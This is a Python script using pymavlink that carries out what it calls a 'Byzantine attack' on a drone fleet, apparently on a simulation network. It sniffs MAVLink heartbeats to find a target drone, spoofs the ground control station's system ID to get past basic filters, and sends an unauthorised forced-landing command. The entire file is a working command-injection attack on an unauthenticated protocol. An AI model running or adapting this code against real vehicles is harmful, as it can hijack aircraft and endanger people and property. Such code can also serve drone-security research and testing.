from pymavlink import mavutil
import time

# 1. Connect to the shared simulation network
# Use 'udpin' to listen to all traffic on the simulation port (usually 14550)
master = mavutil.mavlink_connection('udpin:0.0.0.0:14550')

def run_byzantine_attack():
    print("--- Byzantine Node Active: Sniffing Fleet ---")
    target_sysid = None
    my_sysid = None

    # Step 1: Discover who is who
    # We wait for heartbeats to see the other drones
    while target_sysid is None:
        msg = master.recv_match(type='HEARTBEAT', blocking=True)
        src = msg.get_srcSystem()
        
        if src == 255: continue # Ignore the real GCS
        
        # Assume the first drone we see that isn't us is the target
        if my_sysid is None:
            my_sysid = src
            print(f"[Self] Compromised Drone identified as System {my_sysid}")
        elif src != my_sysid:
            target_sysid = src
            print(f"[Target] Found legitimate Drone at System {target_sysid}")

    # Step 2: Impersonate GCS to hijack the Target
    print(f"--- Launching Hijack on System {target_sysid} ---")
    
    # We "rebind" our identity to 255 (GCS) to bypass basic filters
    master.mav.srcSystem = 255 

    # Step 3: Send a Malicious Command (Force Land)
    # Target the specific drone found during sniffing
    master.mav.command_long_send(
        target_sysid, 1,    # Target Drone ID and Component ID
        mavutil.mavlink.MAV_CMD_NAV_LAND, 
        0, 0, 0, 0, 0, 0, 0, 0
    )
    
    print(f"CRITICAL: Sent LAND command to Drone {target_sysid} impersonating GCS.")

if __name__ == "__main__":
    run_byzantine_attack()